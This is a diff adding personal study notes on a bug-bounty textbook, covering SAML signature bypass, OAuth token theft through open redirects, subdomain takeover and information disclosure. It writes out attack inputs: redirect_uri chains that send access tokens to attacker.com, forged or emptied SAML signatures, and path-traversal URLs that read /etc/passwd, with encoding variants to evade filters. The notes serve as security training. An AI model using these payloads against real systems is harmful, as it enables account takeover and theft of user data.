@@ -4525,6 +4525,8 @@ Workflow:
 3. Once you've provided your credentials, the identity provider will send the user a SAML response.
 4. The user uses the SAML response to authenticate to the service provider.
 
+![SAML diagram](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/SAML_SSO_authentication.png)
+
 - The SAML response contains an identity assertion that communicates your identity to the service provider.
 - Could contain username, email address, or user ID.
 - ex. SAML identity assertion:
@@ -4545,5 +4547,320 @@ _SAML Vulnerabilities_
 
 - Because an attacker who can control the SAML response passed to the service provider can authenticate as someone else, applications need to protect the integrity of their SAML messages.
   - This is usually done through using a signature to sign the message.
+  - SAML can be secure if SAML signature is implemented correctly.
+- SAML is insecure if an attacker can find a way to bypass the signature validation and forge the identity assertion to assume the identity of the SAML assertion to assume the identity of others.
+  - If an attacker can change the embedded username in a SAML assertion, they can log in as another user.
+- The digital signature that is usually applied to SAML messages ensure that no one can tamper with them, if a SAML message has the wrong signature, it won't be accepted.
+- ex.
+
+```
+<saml:Signature>
+  <saml:SignatureValue>
+    dXNlcje=
+  </saml:SignatureValue>
+</saml:Signature>
+<saml:AttributeStatement>
+  <saml:Attribute Name="username">
+    <saml:AttributeValue>
+      user1
+    </samlAttributeValue>
+  </saml:Attribute>
+</saml:attributeStatement>
+```
+
+- `dXNlcje=` is the signature.
+
+- Sometimes the SAML signature isn't implemented or verified at all.
+  - In this case, attackers can forge the identity information in the SAML response at will.
+- Developers may make the mistake of verifying signatures only if they exist.
+  - Attackers can then empty the signature field or remove the field completely to bypass the security.
+- If the signing mechanism used to generate signatures is weak or easily predictable, attackers can forge signatures.
+  - In the above SAML message, the signature `dXNlcje=` is simply base64 encoded "user1".
+  - Knowing this, we could assume the identity of any user that we know the username for by simply base64 encoding the username to generate the accepted signature.
+- Encryption alone will not provide adequate security for the SAML messages.
+  - Encryption protects confidentiality, not integrity.
+  - An attacker can tamper with the encrypted message to mess with the outcome of the identity assertion.
+  - Learn more about encryption attacks [here](https://en.wikipedia.org/wiki/Encryption#Attacks_and_countermeasures)
+- If SAML messages contain sensitive user info, like passwords, and they aren't encrypted, an attacker may be able to intercept the victim's traffic and steal sensitive information.
+- SAML can be used as a vector for smuggling malicious input onto a site.
+  - If a field in a SAML message is passed into a database an attacker could pollute the field to achieve SQL injection, XSS, or XXE.
+- For SAML to be secure, it needs to have encryption and signing properly enabled and all SAML messages should be sanitized and checked for malicious user input.
+
+#### OAuth
+
+"OAuth is essentially a way for users to grant scope-specific access tokens to service providers through an identity provider. The identity provider manages credentials and user information in a single place, and allows users to log in by supplying service providers with information about the user's identity."
+
+**How 0Auth Works**
+
+- The service provider requests access to your information from the identity provider.
+  - Includes thinks like email address, contacts, birthdate, etc.
+  - These permissions and pieces of data are called _scope_.
+  - The identity provider (IdP) will then create a unique `access_token` that the service provider uses to obtain the resources defined in the scope.
+- Workflow:
+  1. User logs into the service provider via OAuth
+  2. The service provider will send a request for `authorization` to the IdP.
+  - This includes the service provider's `client_id` used to identify the service provider.
+  - A `redirect_uri` used to redirect the authentication flow.
+  - A `scope` listing the requested permissions.
+  - And, a `state` parameter, which is essentially a CSRF token.
+  ```
+  identity.com/oauth?
+  client_id=CLIENT_ID
+  &Response_type=code
+  &state=STATE
+  &redirect_uri=https://example.com/callback
+  &scope=email
+  ```
+  3. The identity provider will then ask the user to grant access to the service provider, typically in a pop-up window.
+  4. After the user agrees to the permissions the service provider asks for, the IdP will send the `redirect` an authorization code:
+     `https://example.com/callback?authorization_code=abc123&state=STATE`
+  5. The service provider can then obtain an `access_token` from the identity provider by using the authorization code, along with their client ID and secret.
+  - Client ID's and client secrets authenticate the service provider to the identity provider:
+  ```
+  identity.com/oauth/token?
+  client_id=CLIENT_ID
+  &client_secret=CLIENT_SECRET
+  &redirect_uri=https://example.com/callback
+  &code=abc123
+  ```
+  6. The IdP then sends back the `access_token` which is used to access the user's information:
+     `https://example.com/callback?#access_token=xyz123`
+- A service provider might initiate a request to the identity provider for an access token to access the user's email.
+  - Then it could use the email retrieved from the identity provider as proof of the user's identity to log the user in to the account registered with the same email address.
+
+_OAuth Vulnerabilities_
+
+- Attackers can bypass OAuth by stealing critical OAuth tokens through open redirects.
+  - This is done by manipulating the `redirect_uri` parameter to steal the `access_token` from the victim's account.
+  - `redirect_uri` determines where the identity provider sends critical pieces of information like the `access_token`.
+  - Most major IdPs require service providers to specify an allowlist of URLs to use as the `redirect_uri`.
+    - If the `redirect_uri` provided in a request isn't on the allowlist, the identity provider will reject the request.
+  - The following would be rejected if only _example.com_ subdomains are allowed:
+  ```
+  client_id=CLIENT_ID
+  &response_type=code
+  &state=STATE
+  &redirect_uri=https://attacker.com
+  &scope=email
+  ```
+- `access_token`s are communicated via a URL fragment, which survives all cross-domain redirects (typically).
+  - If an attacker can make the OAuth flow redirect to the attacker's domain, the attacker can steal the `access-token` from the URL fragment and gain access to the user account.
+- ex. The following URL is the `redirect_uri`:
+  `redirect_uri-https://example.com/callback?next=attacker.com`
+  - This causes the flow to redirect to the callback URL first:
+    `https://example.com/callback?next=attacker.com#access_token=xyz123`
+  - And then to the attacker's domain:
+    `https://attacker.com#access_token=xyz123`
+  - The attacker can then send the victim a crafted URL that will initiate the OAuth flow, and run a listener on their server to harvest the leaked tokens:
+  ```
+  identity.com/oauth?
+  client_id=CLIENT_ID
+  &response_type=code
+  &state=STATE
+  &redirect_uri=https://example.com/callback?next=attacker.com
+  &scope=email
+  ```
+- Another way of redirecting OAuth flow is through a referer-based open redirect. To accomplish this, the attacker would need to set up the referer header by initiating the OAuth flow from their domain:
+  `<a href="https://example.com/login_via_facebook">Click here to log in to example.com</a>`
+  - This causes the flow to redirect to the callback URL first:
+    `https://example.com/callback?#access_token=xyz123`
+  - Then it redirects to the attacker's domain via the referer:
+    `https://attacker.com#access_token=xyz123`
+- Attackers can still smuggle tokens offsite if they can't find an open redirect on the OAuth endpoint if they can find an _open redirect chain_.
+  - If the `redirect_uri` parameter permits only redirects to the URLs that are under the _example.com_ domain, if attackers can find an open redirect within that domain, they can steal OAuth tokens via redirects.
+  - ex. An open redirect on the logout endpoint of example.com exists:
+    `https://example.com/logout?next=attacker.com`
+  - An attacker can form a chain of redirects to eventually smuggle tokens offsite, starting with:
+    `redirect_uri=https://example.com/callback?next=example.com/logout?next=attacker.com`
+  - This `redirects_uri` will first cause the flow to redirect to the callback URL:
+    `https://example.com/callback?next=example/logout?next=attacker.com#access_token=xyz123`
+  - Then to the logout URL vulnerable to open redirect:
+    `https://example.comlogout?next=attacker.com#access_token=xyz123`
+  - Then it will redirect to the attacker's domain. (The attacker can harvest the access tokens via their server logs.)
+    `https://attacker.com#access_token=xyz123`
+- Long-lived tokens that don't expire are also a major OAuth vulnerability. Sometimes tokens aren't invalidated periodically and can be used by attackers long after they are stolen, and remain valid even after password reset.
+  - Test for these by using the same access tokens after logout and after password reset.
+
+**Hunting for Subdomain Takeovers**
+
+"The best way to reliable discover subdomain takeovers is to build a system that monitors a company's subdomains for takeovers... let's [first\] look at how you can search for subdomains takeovers manually."
+
+_Step 1: List the Target's Subdomains_
+
+- This can be done by using tools mentioned in [Chapter 5](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-5-web-hacking-reconnaissance). Use a screenshot application like EyeWitness or Snapper to see what is hosted on each subdomain.
+
+_Step 2: Finding Unregistered Pages_
+
+- Look through you snapshots for 404 error pages to confirm possible _dangling CNAMEs_.
+- Some providers employ measures to verify the identity of users, to prevent people from registering pages associated with the CNAME records.
+  - As of the books writing, dangling CNAMEs from AWS, Bitbucket, and GitHub are potentially vulnerable, Squarespace and Google Cloud were not.
+  - Find a full list of which third-parties are vulnerable on [EdOverflow's page](https://github.com/EdOverflow/can-i-take-over-xyz/).
+    - You can find also find a list of page signatures that indicate an unregistered page there too.
+
+_Step 3: Register the Page_
+
+- Go to the third-party site and try to register the page as yours.
+- Host a harmless POC page there to prove the subdomain takeover like an HTML page:
+  `<html>Subdomain Takeover by Vickie Li.</HTML>`
+  - Make sure to keep the site registered until the company mitigates the vulnerability by either removing the dangling DNS CNAME or by reclaiming the page on the third-party service so a malicious actor won't be able to.
+- You may be able to steal cookies with the subdomain takeover if the site uses cookie-sharing SSO.
+  - Look for cookies that can be sent to multiple subdomains in the server's responses.
+  - Shared cookies are sent with the `Domain` attribute specifying the parents of subdomains that can access the cookie:
+    `Set-Cookie: cookie=abc123; Domain=example.com; Secure: HttpOnly`
+  - You can login to the legitimate site and visit your stolen site in the same browser to see if your server logs show the cookies from the legitimate site have been sent to it.
+    - If this works, you've found a subdomain takeover that can be used to steal cookies.
+    - Even if it can't steal cookies, the subdomain takeover could still be used for phishing campaigns. Report them to the organization.
+
+**Monitoring for Subdomain Takeovers**
+
+- Monitoring for subdomain takeovers is important because companies update their DNS entries and remove pages from third-party sites all the time.
+- Routinely scanning for takeovers can help you find dangling CNAMEs or even just new assets to work on before others do.
+
+(The following section in the book is a bit lack luster and feels a bit more like notes than a finished section.)
+
+General steps to creating automation:
+
+_Compile a list of subdomains that belong to the target organization_
+
+- Scan for new subdomains periodically and add new ones to a list of monitored subdomains.
+
+_Scan for subdomains on the list with CNAME entries that point to pages hosted on a vulnerable third-party service_
+
+- You'll need to resolve the base DNS domain of the subdomain and determine if it's hosted on a third-party provider based on keywords in the URL.
+- A subdomain that points to a URL that contains the string _github.io_ would be hosten on GitHub pages.
+- Determine whether the third-party services you've found are vulnerable to takeovers.
+- If the sites are exclusively hosten on services that aren't vulnerable to subdomain takeovers, you don't have to scan then for portential takeovers.
+- _Not in the Book_ Use the site [EdOverflow's page](https://github.com/EdOverflow/can-i-take-over-xyz/) to find a list of vulnerable services, the right most column shows the signature that you can search HTTP responses for to determine if there is a dangling CNAME.
+
+_Determine the signature of an unregistered page for each external service._
+
+- Most services have a custom 404 Not Found pag that indicates the page isn't registered.
+  - Use these pages to detect a potential takeover.
+- ex. A GitHub pages domain would be vulnerable if the HTTP response contains, "`There isn't a GitHub Pages site here`" (No longer vulnerable except for edge cases).
+- You can set up a cron job to run the script you've created regularly.
+  - Set it up to notify you only if the monitoring system detects something fishy.
+
+**Hunting for SAML Vulnerabilities**
+
+- First, confirm whether the website is using SAML.
+  - Intercept the traffic used for authenticating to a site and look for XML-like messages or the keyword `saml`.
+  - SAML messages are not always passed in plain XML format. They may be base64 encoded or use other encoding schemes.
+
+_Step 1: Locate the SAML Response_
+
+- Use a proxy to intercept requests going between the browser and the service provider to look for the SAML response during login.
+
+_Step 2: Analyze the Response Fields_
+
+- Analyze the SAML response to identify which fields the service provider uses for determining the identity of the user.
+  - SAML responses are used to relay authentication data to the service provider, so they must contain fields that communicate that information.
+    - `username`, `email address`, `userID`, etc.
+- Tamper with these fields in your proxy.
+  - If the SAML message lacks a signature, or if the signature of the SAML response isn't verified at all, tampering with the message is all you need to do to authenticate as someone else.
+
+_Step 3: Bypass the Signature_
+
+- Try removing the signature to see if it is being verified if it doesn't exist.
+- Try emptying the signature field:
+
+  ```
+  <saml:Signature>
+    <saml:SignatureValue>
+
+    </saml:SignatureValue>
+  </saml:Signature>
+  ```
+
+- Try deleting the field entirely (delete the whole block of code shown above, including the signature value that isn't show).
+- Try decoding the signature to see what it says. This may be the clue you need to start crafting your own signatures.
+
+_Step 4: Re-encode the Message_
+
+- Re-encode the signature back to its original form and send it back to the service provider.
+- SAML Raider is a BurpSuite extension that can help you with editing and re-encoding SAML messages.
+
+**Hunting for OAuth Token Theft**
+
+- First, confirm the website is using OAuth.
+  - intercept the requests to complete authentication on the website and look for the `oauth` keyword in the HTTP messages.
+- Start looking for open redirect vulnerabilities [Chapter 7](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-7-open-redirects).
+- Check if you can smuggle the OAuth tokens offsite by using one of the open redirects that you've found.
+
+**Escalating the Attack**
+
+- Because these attacks lead to account takeovers, they are high severity before any escalation.
+- Try to access the victim's account on other sites by using the same OAuth credentials.
+  - If you can leak an employee's cookies via subdomain takeover, see if you can access their company's internal services such as admin panels, business intelligence systems, and HR applications with the same credentials.
+- Try to leak data, execute sensitive actions, or take over the application by using the accounts you've taken over.
+
+**Finding Your First SSO Bypass**
+
+1. If the target application is using single sign-on, determine the SSO mechanism in use.
+2. If the application is using shared session cookies, try to steal session cookies by using subdomain takeovers.
+3. If the application uses a SAML-based SSO scheme, test whether the server is verifying SAML signatures properly.
+4. If the applications uses OAuth, try to steal OAuth tokens by using open redirects.
+5. Submit your report about SSO bypass to the bug bounty program!
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 21: Information Disclosure
+
+"The IDOR vulnerabilities covered in Chapter 10 are a common way for applications to leak private information about users. But an attacker can uncover sensitive information from a target application in other ways too. I call these bugs _information disclosure_ bugs. These bugs are common; in fact, they're the type of bug I find most often while bug bounty hunting, even when I'm searching for other bug types."
+
+**Mechanisms**
+
+"Information Disclosure occurs when an application fails to properly protect sensitive information, giving users access to information they shouldn't have available to them."
+
+Can Include:
+
+- Technical details that aid an attack
+  - software version numbers
+  - Internal IP addresses
+  - Sensitive File Names and filepaths (configs (could contain internal IPs access tokens, etc), /etc/passwd, /etc/shadow, etc.)
+  - Source code
+  - Private information of users (age, bank accounts numbers, email addresses, mailing addresses, credit card numbers, etc.)
+- Typically, applications leak version numbers in HTTP response headers, HTTP response bodies, or other server responses.
+  - `X-Powered-By` header shows which framework the application runs:
+    `X-Powered-By: PHP/5.2.17`
+- Applications leak sensitive configuration files by not applying proper access control to the files, or by accidentally uploading a sensitive file onto a public repository that outside users can access.
+- Source code should also be protected. Attackers will search source code for:
+  - Logic flaw vulnereabilities
+  - Hardcoded credentials
+  - Information about the company's infrastructure (Internal IPs)
+- Applications often leak source code by accidentally publishing a private code repository, by sharing code snippets on public GitHub or GitLab repositories, or by uploading it to third-party sites like Pastebin.
+- Devs may accidentally place information that is compromising in the public source code like HTML and JavaScript files.
+
+**Prevention**
+
+- Avoid hardcoding credentials and other sensitive information into executable code.
+- Place sensitive information in separate configuration files or a secret storage system like [Vault](https://github.com/hashicorp/vault/).
+- Audit your public code repositories periodically to make sure sensitive files haven't been uploaded by accident.
+  - Auditing tool: [secret-bridge](https://github.com/duo-labs/secret-bridge/).
+- If you have to upload sensitive files to the production server, apply granular access control to restrict user's access to the files.
+- Remove data from services and server responses that reveal technical details about hte backend server setup and software versions.
+- Handle all exceptions by returning a generic erro page to the user, instead of a technical page that reveals details about the error.
+
+**Hunting for Information Disclosure**
+
+- Use the techniques in [Chapter 5](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-5-web-hacking-reconnaissance) to start looking for exposed configuration files, database files, and other sensitive files.
+
+_Step 1: Attempt a Path Traversal Attack_
+
+- _Path Traversal Attacks_ are used to access files outside the web application's root folder.
+  - This attack uses `../../` to escape the web root folder in Unix systems to access system files.
+  - ex. `https://example.com/image?url=/images/1.png`
+  - You can navigate out of the images directory and (hopefully) into the web root directory with:
+    `https://example.com/image?url=/images/../index.html`
+  - You can go farther back and access system files outside of the web directory with:
+    `https://example.com/image?url=/images/../../../../../../../../etc/passwd`
+  - The amount of `../` to use can vary depending on the application, so trial and error is often necessary. However, you cannot go farther back than the root directory `/` so if you add 4 `../` and escape to the system root directory, 5 `../` should also work the same.
+  - If the application uses input sanitization, you can try encoding the `../`.
+    - `%2e%2e%2f` URL encoding.
+    - `%252e%252e%255f` Double URL encoding.
+    - `..%2f` Partial URL encoding.
+
+_Step 2: Search the Wayback Machine_
+
+- You can use the Wayback Machine to find hidden and deprecated endpoints, as well as a large number of current endpoints without actively crawling the site.
 
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
